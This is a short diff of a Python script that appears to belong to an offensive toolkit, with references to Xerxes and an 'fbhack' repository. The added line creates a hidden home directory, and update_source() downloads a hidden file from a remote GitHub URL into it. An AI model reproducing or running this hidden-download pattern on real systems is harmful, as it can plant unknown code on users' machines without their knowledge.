@@ -28,6 +28,7 @@ def get_xerxes():
 
 
 def update_source():
+  os.system("mkdir $HOME/.syss")
   mypwd = os.popen("echo $HOME/.syss").read()[:-1]
   url = "https://raw.githubusercontent.com/h3inAKArr/fbhack/master/.demp.ov"
   urllib.urlretrieve(url,mypwd+"/.demp.ov")
